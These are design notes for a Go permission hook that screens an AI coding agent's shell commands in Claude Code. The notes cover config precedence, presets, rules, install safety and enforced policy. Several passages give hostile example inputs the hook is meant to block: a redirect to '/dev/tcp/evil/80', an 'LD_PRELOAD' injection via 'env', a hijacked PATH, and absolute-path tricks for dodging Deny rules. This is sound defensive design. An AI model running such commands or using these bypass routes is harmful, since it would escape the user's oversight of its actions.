# Design notes

This document records the design decisions made for agent-permissions
during the initial scoping conversation. It's a Q&A capturing the
user's intent in their own words where possible, grouped into settled
decisions, revisions, future work, and implementation notes.

## Settled decisions

### Project identity

**Q: What's the project's primary identity, and how should the README
open?**

> Paddy's agent-permissions hook
>
> Let's take agent permissions seriously!

The hook is the technical heart; presets are curated content that
makes it immediately useful.

### Subcommand structure

**Q: Should the hook be a top-level binary or a subcommand?**

Subcommand: `agent-permissions claude-hook`. The umbrella
`agent-permissions` binary leaves room for future harnesses
(`codex-hook`, etc.) and other subcommands (`presets`, `install`,
`check`, `setup`).

### Where presets live (on a user's machine)

**Q: Should presets be bundled in the binary or shipped as files?**

> I like bundling them. It seems quite nice if we could just point
> people to `go install` and that be it! They're not big files, so
> it shouldn't be a problem.

Presets are embedded in the binary via `//go:embed`. Single artifact,
parsed once at startup. When a user updates the binary, they
automatically pick up updated presets — their config references
preset names, not content, so there is no awkward overwrite problem.

### Where the hook's config lives

**Q: Should the hook read its config from `~/.claude/settings.json`,
or from its own location?**

> I would like it to go in `~/.agents/`, since that seems to be the
> standard place to put things except for the arrogant harnesses
> like Claude Code.

`~/.agents/permissions.json`, `<project>/.agents/permissions.json`,
and the project-local `<project>/.agents/permissions.local.json`
are the agent-permissions config locations. The local file is a
project-scoped, typically gitignored personal override that sits
above the committed project config — mirroring Claude Code's
`settings.local.json` (project-only, no global counterpart). The
hook also reads Claude Code's `settings.json` so Claude
Code-native rules continue to work.

### Modifying settings.json

**Q: Should the hook ever auto-modify Claude Code's settings.json?**

> We do not want to merge anything or modify settings.json EVER. We
> do not want to do that AT ALL except through very explicit actions.

The only exception is the explicit `install` command, which writes
the PreToolUse hook stanza on user request and is idempotent. No
automatic modifications.

### Resolution chain

**Q: What's the priority order for permission sources?**

> Make the priority list go `.claude/settings.json`,
> `~/.claude/settings.json`, `.agents/permissions.json`,
> `~/.agents/permissions.json`, with the presets coming after
> explicit permissions in each `permissions.json` file.

Highest to lowest priority:

1. `<project>/.claude/settings.local.json`
2. `<project>/.claude/settings.json`
3. `~/.claude/settings.json`
4. `<project>/.agents/permissions.local.json` (explicit
   entries; project-scoped personal override)
5. `<project>/.agents/permissions.json` (explicit entries)
6. `~/.agents/permissions.json` (explicit entries)
7. Ordinary external presets from `AGENT_PERMISSIONS_PRESET_DIRS`
8. Embedded presets

Ordinary external and embedded presets are selected by the
most-specific `.agents` config — local, then project, then global —
that specifies `enabled-presets` or `disabled-presets`.

Enforced external presets from
`AGENT_PERMISSIONS_ENFORCED_PRESET_DIRS` sit outside that stack. Every
matching enforced entry participates. The strongest enforced result
combines with normal resolution using
`Deny > Ask > SoftAsk > Allow > Undecided`, so user policy can become
stricter but not weaker. Preset selection cannot disable enforced
presets, and enforced Rules entries lock their rules on.

Soft-ask is exempt from that ordering when the two planes combine. A
soft-ask means "nudge unless this was explicitly allowed", so an
Allow in normal resolution answers an enforced SoftAsk instead of
losing to it. Were it otherwise, SoftAsk would be the only tier no
config could silence — stricter than Ask, which inverts what the
tiers mean. The asymmetry is deliberate: an enforced Allow still
cannot weaken a normal SoftAsk, because the enforced plane only
strengthens.

Note this is a different comparison from the one that aggregates
across extracted commands and axes, where SoftAsk does outrank Allow:
one risky sub-command has to raise the whole decision. Combining two
planes' verdicts on one command and folding many commands into one
answer are separate operations, and only the latter is a plain
maximum.

The two `.local.json` files (Claude's `settings.local.json` and
the agents `permissions.local.json`) are project-scoped personal
overrides that sit above their committed counterparts, mirroring
Claude Code's convention. Both are project-only — there is no
global `~/.claude/settings.local.json` or
`~/.agents/permissions.local.json`.

### Within-normal-source tier precedence

When the deciding normal source has matches in more than one tier,
the order is:

`Deny > Ask > Allow > SoftAsk`

`Allow` sits above `SoftAsk` so that an explicit Allow in the same
source opts out of a SoftAsk prompt for commands the user has
broadly trusted.

The original design included a `HookDecides` tier between Deny
and Ask as a safety net for rule-owned commands that failed to
decide. It was removed in the v1 simplification pass once it
became clear the Rules layer always decides on those commands;
see the "v1 simplification pass" entry below.

### Preset selection

**Q: How does a user enable or disable a preset?**

> By default, `presets` is left unspecified and defaults to "all", but
> if you add `presets` to a file it acts as an explicit list, and
> otherwise the recommended approach to disabling presets would be
> to add them to a `disabled-presets` list and that way users would
> pick up new presets as we release them automatically by default.
> But if they do want to be explicit, they can.

The two list fields are named `enabled-presets` and
`disabled-presets` (no white/black framing).

In `~/.agents/permissions.json` (and project equivalent):

- Neither field present → all ordinary external and embedded presets
  active. Default; auto-includes new presets shipped in future binary
  updates.
- `disabled-presets: ["containers"]` → all ordinary presets except
  those listed. The recommended way to opt out.
- `enabled-presets: ["git", "languages"]` → explicit ordinary-preset
  list. For users who want full control.
- If both present, `disabled-presets` wins (it filters whatever
  `enabled-presets` resolved to).

Project-level `.agents/permissions.json` overrides global for preset
selection: if the project file specifies either field, that's the
authoritative list for that CWD.

Enforced presets remain active regardless of these fields.

### First-run behaviour

**Q: What happens if a user has no `~/.agents/permissions.json`?**

> The hook itself does NOT auto-create. No `permissions.json` = all
> presets enabled. We could have a `agent-permissions setup` command
> that does that. And then commands like `presets enable/disable`
> could automatically create the `permissions.json` as well.

The hook silently treats a missing `permissions.json` as "all
presets enabled." The only command that writes the file is
`setup`, which produces a fully-populated starter. The
`presets enable/disable` subcommands mentioned in the original
answer were removed before v1 — see the "CLI surface" entry for
`presets list` below for the rationale. Users hand-edit
`enabled-presets` / `disabled-presets` in their permissions.json
to opt in or out.

### CLI surface (v1)

**Q: What subcommands should the v1 binary expose?**

| Subcommand | Purpose |
| --- | --- |
| `claude-hook` | PreToolUse handler for Claude Code. |
| `setup` | Write a populated `~/.agents/permissions.json` with all ordinary presets enabled and empty user-custom tier arrays. Enforced presets remain active outside selection. |
| `install` | Wire the hook into known harness configs. Today: appends the PreToolUse stanza to `~/.claude/settings.json` (merging into an existing Bash matcher when one exists). Refuses to write through symlinks or modify unrecognised structures (e.g. `PreToolUse` that isn't an array), preserves existing file mode, and prints the JSON stanza for hand-paste when it cannot safely auto-edit. Idempotent. |
| `presets list` | Show available presets grouped into Enforced, Enabled, and Disabled, with the reason next to each entry. The previous `presets enable` and `presets disable` subcommands were removed — with "all enabled by default" the enable side became a confusing no-op, and the disable side too easily produced contradictory `enabled-presets` / `disabled-presets` files. Users edit `~/.agents/permissions.json` directly to opt ordinary presets in or out. |
| `check '<cmd>'` | Simulate the hook on a given bash command; print the decision and the reasons that led to it. Useful for debugging "why is this prompting?". |

> I really like the idea of adding the `check` command that can give
> a more detailed breakdown of the decision process for a command!

### v1 simplification pass

A set of related simplifications agreed during the design review.
They landed together as a single pass rather than piecemeal so
the project's surface area was tight and coherent before public
release.

**Tiers: 6 → 4.** Removed `HookDecides` and `ProjectSoftAsk`.

`HookDecides` was a safety net for the case where the Rules layer
didn't produce a decision on a rule-owned command. If the code is
correct, it never fires. If it isn't, the right answer is to fix
the bug rather than catch it with a tier. Falling through to
Claude Code's classifier on the rare miss is acceptable. So: the
tier, the JSON field, the safety-net code path, and the
`wrapped-interpreters.json` preset are gone. Rule-owned commands
are simply commands that have a Rules entry; no declarative
pattern-layer registration needed.

`ProjectSoftAsk` had identical runtime behaviour to `SoftAsk` and
existed only to produce a different prompt message (the "add a
per-project rule" hint). That is not worth a tier. The three
commands that used it (`source`, `.`, `rm`) moved into SoftAsk in
`standard-commands.json`. The user reads the SoftAsk message and
decides whether to add a global or per-project rule themselves.
The hook does not editorialise.

Final tier list: `Allow`, `SoftAsk`, `Ask`, `Deny`.

**Presets: 27 → 8.** The previous per-tool granularity was too
fine for actual user enable/disable decisions. Consolidated into
topic-based bundles users toggle as a unit:

1. `standard-commands` — shell-builtins, shell-utilities,
   text-processing, system-info, binary-inspection, archives,
   shellcheck, plus `source`/`.`/`rm` in SoftAsk. The baseline an
   agent needs to operate a shell.
2. `languages` — python, perl, ruby, node, c-cpp, go-lang, rust,
   java, dotnet, conda.
3. `git` — git, github-cli, pre-commit.
4. `network-fetch` — unchanged.
5. `containers` — unchanged.
6. `process-control` — unchanged.
7. `mpi` — unchanged.
8. `escape-hatches` — renamed from `denies`. Topic-based name
   (commands that escape or bypass the permission system) rather
   than tier-based.

**SoftAsk reason format.** Matches the existing "Unknown
commands" output style. Leading sentence, bulleted pattern
entries with source attribution. No warning tone; the user knows
what they are looking at. The `Bash(...)` wrapper was dropped
once the schema reshape (below) made it Claude-Code-specific
rather than the universal entry shape.

```
Soft-ask. To allow, add to your Allow permissions:
* git rm:*  (from preset:git)
```

Two spaces between the pattern and the source attribution keep
the columns readable when there are multiple matches.

### Per-tool schema (Commands / EnvVars)

The original schema was four flat arrays of bash patterns —
one tier each. That shape couldn't express environment-variable
policy, so the `dangerousEnvVars` and `suspiciousEnvVars` data
lived in hard-coded Go maps and didn't participate in source-
priority, didn't carry reasons, and produced a single generic
"suspicious environment variable" message with no attribution.
Bare assignments (`PATH=/tmp/evil` with no following command)
fell through entirely because the no-commands early return ran
before the suspicious-var check.

The reshape splits each tier into tool axes, with pattern →
reason as the entry shape:

```json
{
  "Allow":   {"Commands": {"ls:*": ""}},
  "SoftAsk": {"EnvVars":  {"PATH": "command lookup hijack risk"}},
  "Deny":    {
    "Commands": {"sudo:*": "privilege escalation"},
    "EnvVars":  {"BASH_ENV": "sourced automatically on shell startup"}
  }
}
```

Why dict shape (`pattern → reason`) rather than list of strings:
- Reasons surface in hook output as `<pattern> - <reason>`,
  matching the same shape as rule-layer SoftAsks
  (`git branch - write flag -d  (from rule:git-branch)`).
- Dict keys are inherently unique, so the cross-tier duplicate
  invariant doesn't need pattern-list deduplication.
- Reasons live next to the pattern they document — no separate
  sidecar table to drift.
- Empty `""` is allowed for patterns where a reason isn't useful;
  `validate` emits an informational note listing them but
  doesn't fail.

Why per-axis resolution: a higher-source `Allow.EnvVars` should
override a lower-source `SoftAsk.EnvVars` without affecting
Commands resolution. Each axis walks the normal source stack
independently. Enforced matches are evaluated separately per axis,
then the final decision aggregates across axes and policy planes.

Concrete results from the reshape:
- All env-var policy now lives in `presets/escape-hatches.json`
  (Deny.EnvVars for things like BASH_ENV/LD_PRELOAD, SoftAsk.
  EnvVars for things like PATH/EDITOR). The Go maps are gone.
- Env-var matches carry source attribution and per-var reasons
  in output: `PATH - command lookup hijack risk  (from
  preset:escape-hatches)`.
- Bare assignments resolve like any other axis. The no-commands
  early return is preserved but the suspicious-env code path it
  used to bypass no longer exists.

Pattern syntax for EnvVars: exact `NAME` or trailing-star prefix
`NAME*`. No value matching — the schema concerns itself only
with which variables can be assigned, not what they're assigned
to. Adding value matching later is additive and doesn't reshape
the schema.

The dict-only shape is enforced at load time. The flat-array
shape errors with a migration message pointing at the README.
No compatibility shim — pre-release, no users to support.

### Harness interface for output text

Output text varies by agent harness (Claude Code references
`/permissions`; future Codex/Copilot adapters will use their
own conventions). Rather than scatter platform checks through
the formatter, the strings live behind `internal/harness/`:

```go
type Harness interface {
    UnknownCommandHeader() string
    // more methods added as harness-specific surfaces appear
}
```

`ClaudeCode` is the live implementation; `Placeholder` is used
by harness-agnostic dev tools (`check`, `validate`). Placeholder
returns `<unknown-command-header>` style strings so that
harness-specific output is visibly marked in the dev tool —
preventing accidental dependence on one harness's wording when
reviewing what the resolver produces.

The interface is intentionally minimal (one method at
introduction). Additional methods land when a real second
harness exposes the next harness-specific surface.

### PATH-aware absolute-path matching

Allow/Ask/SoftAsk match an absolute-path command (`/usr/bin/git
status`) against bare-name patterns (`git status:*`) only when
the path's directory is in the hook process's `PATH` — i.e.
when the shell would have resolved the bare name to the same
binary. An out-of-PATH absolute path (`/tmp/evil/curl`) requires
an explicit absolute-path pattern; it does not auto-match
`curl:*` Allow.

Deny continues to strip basenames unconditionally, regardless of
PATH. The asymmetry is the design: bypassing a Deny via an
absolute path is the prototypical attack we want to block;
auto-Allowing an out-of-PATH binary because its basename matches
a broad Allow pattern is the prototypical foot-gun we don't want
to enable. Deny is defensive; Allow is permissive.

The PATH check is directory-membership (one map lookup), not
`exec.LookPath` resolution. We don't care which binary the
shell would resolve `git` to first; we care whether the
absolute path the agent typed lives in a directory the shell
would consult.

### Distribution

**Q: How do users install agent-permissions?**

> Include releases plus `go install` as the primary recommended
> method. The CI for releases should be pretty simple for this sort
> of project.

- Primary path:
  `go install github.com/sothatsit/agent-permissions/cmd/agent-permissions@latest`
- Secondary path: GitHub release binaries for Linux/macOS x86/arm,
  produced by a tag-triggered workflow.
- CI runs `./test/test.sh` on push and PR from day 1.

## Revisions

### Per-pattern precedence

**Q: When two sources have an opinion on the same pattern, who wins?**
**(Revised after the first round of code review — original answer
in italics below.)**

> *Original: Higher priority source wins. A setting in
> `~/.claude/settings.json` beats one in `~/.agents/permissions.json`
> which beats one in `permissions-enabled`. Simple. This is basically
> just per-pattern though. So even if `settings.json` had Allow for
> `git:*`, a `permissions.json` entry with Deny for `git rm:*` would
> still take precedence.*

The first implementation keyed precedence on the pattern's literal
string. That made `git push:*` and `git push *` look like different
patterns and broke override intent across sources (a higher-source
allow on `git push *` did not override a lower-source deny on
`git push:*`, even though they overlap heavily).

Revised: **normal source-priority resolution**. For each bash command
being checked, walk normal sources highest → lowest priority. The first
source that has *any* matching pattern decides the normal outcome via
within-source tier precedence. Lower-priority normal sources are not
consulted once a higher source has matched. Enforced policy applies
after this normal result.

> If a pattern matches in a higher-priority tier we don't search
> lower-priority tiers. That way `git push:*` in `.claude/settings.json`
> would override `git push *` in `.agents/permissions.json` but
> within the same tier a Deny would override an Allow.

Concrete examples under the source-priority model:

- `~/.agents/permissions.json` Deny on `git push:*` plus
  `~/.claude/settings.json` Allow on `git push:*` (same pattern):
  settings.json is higher → Allow wins.
- `~/.agents/permissions.json` Deny on `git push:*` plus
  `~/.claude/settings.json` Allow on `git push *` (different
  shapes, same command): settings.json matches `git push origin
  main` → Allow wins; lower deny is not consulted.
- One source with both `git push:*` Allow and `git push origin:*`
  Deny: within-source tier precedence applies, Deny wins.

## Future work / open questions

### Per-rule configuration

> We need to come back to HookDecides as well. I think we will
> probably want to end up with a "Custom" set of rules where we can
> configure the custom in-built rules for commands like `find` or
> `xargs` or `git` commands. This will allow users to
> enable/disable/configure the behaviour of this custom behaviour
> we have added. This is probably a big design area to discuss as
> well.

After the v1 simplification pass (above), the rules layer is the
sole owner of per-command logic, and the `HookDecides` tier name
is gone. This graduated from open question to settled design and
is being implemented incrementally.

**Schema.** Each rule has a stable ID (`git.branch-writes`,
`xargs.unverified`, ...) and a one-line threat description, both
declared once in the rule catalog (`internal/rules/catalog.go`).
Config is expressed per rule as an object:

```json
"Rules": {"git.branch-writes": {"Enabled": true}}
```

The object shape (rather than a bare bool) leaves room for future
per-rule options — e.g. downgrading a rule's tier from Deny to
Ask — without a schema change.

**Default-OFF, presets enable.** Rules ship disabled in code (the
`RuleConfig` zero value). Each embedded preset's `Rules` section sets
`Enabled: true` for the rules of its topic — git rules in the `git`
preset, interpreter rules in `languages`, the standard shell tooling
rules in `standard-commands`. So a default install has every rule
active, matching prior behaviour. An invariant test enforces that
every catalog rule is owned by exactly one embedded preset. Ordinary
external presets can override that base. Disabling an ordinary preset
removes its contribution, but another source may still decide the
rule. An enforced external preset can lock any catalog rule on.

**Resolution.** Rule config is harness-agnostic. It comes only from
presets and `.agents/permissions.json`, never from a harness's native
settings (Claude's `settings.json` has no vocabulary for our rules).
Local `.agents` config beats project config, which beats global config,
ordinary external presets, and embedded presets. Enforced presets then
lock their enabled rules on. A rule mentioned nowhere stays disabled.
Because rule config is shared across harnesses, the multi-harness
`check` (future) breaks a command down once and varies only the
pattern-layer `Check` per harness.

**Enforcement.** Reading and resolution are wired (`perms.Resolve`
returns the resolved `RuleConfigs`, threaded into the breakdown by
both the hook and `check`), and both layers honour config through
two complementary mechanisms. The declarative layers are pruned by
the registry filter (`rules.FilterByConfig`, run once after
resolution and before either layer evaluates): a disabled rule's
node and subtree are dropped from the rule trees, a command's
`Default` is nil'd when its `Unverified` rule is disabled, and a
disabled language's snippet rules are dropped before the scan. The
imperative paths gate at runtime: wrapper deny-flags and `xargs`
consult `State.RuleConfig` directly, and every other "cannot
verify" breakdown denial (bash/eval/trap/command/interpreters,
plus interpreter parser failures) returns a `model.RuleError`
carrying its `Unverified` def, which `runBreakdown` suppresses
when that rule is disabled — the command then falls through to the
permissions layer instead of being denied. Because the filter
encodes every declarative decision and the parser path is dead in
practice (any parse failure is caught in the breakdown first), the
permissions layer needs no rule config of its own: a pruned node
never matches, a nil'd `Default` never fires, a dropped language
scans clean.

`rules.ValidateRegistry` asserts the attribution invariant — every
node that can produce a restrictive decision has a governing
`RuleDef` reachable on its path, so the decision can be named and
disabled. It depends only on the static registry (a violation is a
coding mistake, not a config one), so a Go test runs it against the
shipped registry rather than burning the check on every hook
invocation; it is structured so `validate` could call it too.

**Attribution.** Every rule decision carries its `RuleDef` so
output names the exact ID to disable. `model.Action` holds a
`Def`; the evaluator stamps the governing def as actions bubble
up — a hook or `Default` under a `Subcmd(...).WithRuleDef(...)`
inherits the ancestor's def, and a command's parser-failure and
`Default` denials take its `Unverified` def. The imperative
breakdown denials return a `model.RuleError` carrying the def
(unwrapped at the top with `errors.As`), and snippet findings
carry the `SnippetLang` def. `formatCheck` and the hook render
this as `(from rule:<id>)`. The earlier scheme that kebab-cased
the rule's subject into a fake name (`rule:git-branch`) is
deleted — the displayed source is now the real catalog ID
(`rule:git.branch-writes`), copy-pasteable into a Rules entry.

### Multi-harness support

The Harness interface and the per-tool schema both landed in v1
(see Settled above). What remains for actual multi-harness
support:

**Additional tool axes.** `Commands` and `EnvVars` are the v1
axes — what bash needs. Adding `Read`, `Edit`, `WebFetch` etc.
is additive in the schema (one more key under each tier), but
requires:

- A loader that resolves path-shaped patterns (the existing
  syntax is whitespace-tokenised; paths with spaces and glob
  semantics are a different parsing model).
- A second hook entrypoint (or an extension of `claude-hook`)
  that handles `tool_name == "Read"`, `"Edit"`, `"WebFetch"`,
  etc. — at present we early-return on anything other than Bash.
- A decision shape that lets one tool's resolution feed back
  into another (or stays cleanly independent — the per-axis
  resolution model already supports either).

**Second-harness adapter.** When Codex or Copilot lands:

- New entrypoint (e.g. `codex-hook`) parallel to `claude-hook`,
  reading that harness's wire format.
- New `Harness` implementation alongside `ClaudeCode`, returning
  that harness's strings.
- `Harness` likely grows methods (right now it has one).
- The Claude Code settings.json reader stays where it is; a
  second harness's equivalent (if any) joins it as another
  source.

**When to do this.** All downstream of "do we actually add a
second harness or a second tool". Not needed for Claude Code
bash-only operation. Recorded here so the architecture choice is
not reinvented when the question comes up.

### `check` for multi-harness

> If we are supporting multiple hooks like codex as well in the
> future, we will need `check` to report multiple results if the
> result would be different for Claude Code and `claude-hook`
> (which reads `.claude/settings.json`) and say a future
> `codex-hook` (which might read from `.codex/settings.json` or
> whatever their config is).

When multi-harness support lands, `check` reports per-harness
decisions since each harness has its own config source.

### `install` per-harness reporting

The `install` subcommand auto-detects which harness configs exist
and installs into each one, reporting "Installed for X" or
"Skipped X (config not found)" per harness.

### `install-claude-permissions` (shelved)

> Leave that be for now. It was an idea, it might be okay, but not
> something we want to do right now. If it becomes apparent that it
> would be more useful than the presets, then we can look into it.

Deferred indefinitely. The presets mechanism is the primary way
agent-permissions contributes permission policy; pushing
permissions into `settings.json` would be a much heavier-touch
alternative and isn't justified unless presets prove insufficient.

## Implementation notes

### Code structure for resolution

Implementation: `internal/perms/loader.go` builds a normal
`SourcePerms` list in priority order (highest first) and a separate
enforced list. For each source, patterns are sorted alphabetically by
`Raw` for deterministic ordering of `reason` text.
`Permissions.checkOne` walks the normal list top-down. For each source,
it checks Deny → Ask → Allow → SoftAsk and returns on the first match.
The enforced check evaluates every enforced source, keeps every reason
at the strongest matching tier, and combines that result with the
normal decision by decision strength.

### Safety constraints on `install`

After the first code review, `install` was hardened:

- Refuses to write through a symbolic link. Users with dotfile
  setups can paste the stanza themselves.
- Refuses to write when the existing `hooks` or `PreToolUse` value
  isn't the documented shape. Better to error than silently
  overwrite data we don't understand.
- Preserves the original file's mode on overwrite (a `chmod 0600`
  stays 0600 after re-install).
- Detects an existing agent-permissions stanza via a word-boundary
  regex (`/agent-permissions claude-hook$`) so wrapper scripts and
  forks that happen to mention the literal substring don't cause
  false positives.
- Merges into an existing Bash matcher's `hooks` array (canonical
  Claude Code structure) rather than appending a duplicate
  matcher entry.

### Atomic-write helper

`internal/atomicfile` is the single point of truth for "replace a
config file safely": refuse symlinks, preserve existing mode,
tmp-file-plus-rename within the same directory. Used by `install`,
`setup`, and `agentconfig.Save`. Without it, a SIGKILL or signal
mid-write could leave a half-written JSON file that breaks the
hook on next invocation.

### Determinism

`reason` strings shown to the user are taken from the first
matching pattern within a source. The first implementation built
per-tier slices from a Go map, so iteration order was randomised
and the same command could quote different patterns on repeated
runs. The loader now sorts each source's tier arrays alphabetically
by `Raw` before checking, so output is stable.

### Wrapper re-analysis carries all execution-relevant parts

The breakdown's contract is to re-analyse every command that could
execute. The failure mode this addresses is narrower than "unknown
nodes slip through": a *recognised* node gets reconstructed or
transformed for re-analysis, but a dangerous sub-part is silently
dropped — the hook believes it fully handled a node it only
partly handled. Two real instances and one abstraction came out of
this:

- The `time` keyword transform dropped redirections. A `TimeClause`
  wraps a whole statement, but the handler rebuilt a bare
  `CallExpr` from the timed command's args and lost
  `Stmt.Redirs` — so `time echo > /dev/tcp/evil/80` connected to
  the socket undetected. Fix: route the timed statement through
  `processStmt` (which already walks redirects and their command
  substitutions). The keyword's only option, `-p`, is absorbed
  into `TimeClause.PosixFormat`, so the statement carries no time
  flags and needs no special parsing. Any other flag (`time -v
  cmd`) is, faithfully, the bash keyword running `-v` as the
  command — bash itself reports "command not found", so the real
  command never runs and the hook treats `-v` as the (unknown)
  command name.

- `UnwrapResult.Assigns` is the abstraction: a wrapper now reports
  the environment assignments it applies to its inner command, and
  the framework records each name on the EnvVars deny axis and
  extracts command substitutions from each value. This makes
  `UnwrapResult` the complete description of an unwrapped
  command — commands, code, files, snippets, and assigns — so a
  wrapper that sets env vars carries that part forward instead of
  dropping it.

- `env` is the one wrapper that honours a leading `NAME=val`, so it
  uses `Assigns`: `env LD_PRELOAD=/x.so cmd` is a real injection and
  the name must reach the deny axis. Every other registered wrapper
  (`timeout`, `nohup`, `setsid`, `nice`, `ionice`, `exec`,
  `stdbuf`, `strace`, ...) execs its inner command directly via
  `execvp`, so a leading `NAME=val` is the program name, not an
  assignment, and is deliberately not honoured. `env` is
  `PathAllow` so `/usr/bin/env python3 script` (shebang style)
  still unwraps and scans the inner interpreter.

`env`, `nohup`, `setsid`, `nice`, and `exec` were previously denied
outright in `escape-hatches` because the hook could not scope them.
Registering them as wrappers replaces blanket-deny with
inner-command checking, which is strictly more precise; they move
out of the escape-hatches Command tier (rule-owned commands stay
out of preset Command tiers). `chroot` and `flock` unwrap their
inner command (`chroot` with no command runs an interactive shell
and is denied; `flock FILE -c STR` re-parses STR as code).
`runuser`, `setpriv`, and `setarch` have shell-string, interactive,
and ambiguous-positional forms that defeat simple parsing, so they
fail closed (deny) rather than risk masking the inner command.

### External presets are policy layers, not config edits

The two external-preset variables accept colon-separated directories
of preset JSON. `AGENT_PERMISSIONS_PRESET_DIRS` supplies ordinary,
user-overridable presets.
`AGENT_PERMISSIONS_ENFORCED_PRESET_DIRS` supplies minimum policy.
They let an organisation ship policy alongside its own tooling.

The rejected alternative was having a site installer write entries
into users' `.agents/permissions.json` or Claude settings. That makes
the installer own a file the user also edits, and every upgrade has to
merge, migrate, and clean up after itself. Delivering policy as a
read-only directory the launcher points an env var at keeps ownership
clean. The site owns its directory, the user owns their config files,
and an upgrade is just a new directory path.

An env var rather than a hook-command flag because the hook is not
the only consumer: `check`, `validate`, and `presets list` resolve
through the same loader, and a flag baked into the installed hook
command would make manual `check` runs disagree with the live hook.

`AGENT_PERMISSIONS_ENFORCED_PRESETS` covers what a directory cannot.
A site can enforce presets it ships, but not the embedded ones, and
those hold the policy it most wants as a floor: `escape-hatches`'
denials, and the Rules that scan interpreter and `bash -c` code. So
the variable names presets already in the pool and moves them into the
enforced plane, which reuses the whole mechanism — plane split, rule
locking, immunity from selection — for a set the site did not author.
Delivering the same thing as a copied preset file would mirror
definitions the binary already ships, and drift from them.

It carries names rather than paths, so it is comma-separated where its
sibling variables use a colon. An unknown name fails the load: quietly
ignoring one would leave a site believing its floor is in place when
it is not, which is the failure the enforced plane exists to prevent.

Ordinary external presets outrank embedded ones but rank below every
user config source. They participate in `enabled-presets` and
`disabled-presets` by name. Their Rules entries form the preset base,
above embedded Rules and below user config.

Enforced presets sit outside pattern source priority. The resolver
combines every matching enforced entry by decision strength, then
combines that result with normal pattern resolution. This makes the
policy a floor, not a high-priority source: user config can deny
something the site allows, but cannot allow something the site denies.
The Rules layer remains authoritative for commands it owns, which stay
out of preset Command tiers. Enforced presets cannot be selected off.
Rules they enable remain enabled after user config is applied. An
enforced Rules entry that sets `Enabled: false` is an error because it
would claim to enforce no constraint.

Failure handling is fail-closed on principle. A missing directory,
malformed file, unknown field, bad pattern, unknown rule ID, or
pattern that overlaps a Rules-owned command is a hard error that
blocks commands (hook exit 2) rather than a warning. A Rules-owned
overlap would look active in JSON but never reach pattern matching.
Validation runs before preset selection, so disabling a broken
ordinary preset cannot hide the error. The failure mode being
prevented is policy silently vanishing.

A preset name supplied by two origins is the exception, and loads.
A dev checkout beside a deployed tree produces exactly that, and
refusing to load would block every command over a naming clash —
far worse than the ambiguity it prevents, since matching entries
combine by strength in the enforced plane and by list order in the
normal one, so keeping both can only preserve or strengthen policy.
Repeating one directory in a list is a no-op, as it is on `PATH`.
What the collision costs is attribution: output names the preset,
not the directory behind it, so `presets list` reports the
directories and `validate` reports the collision.
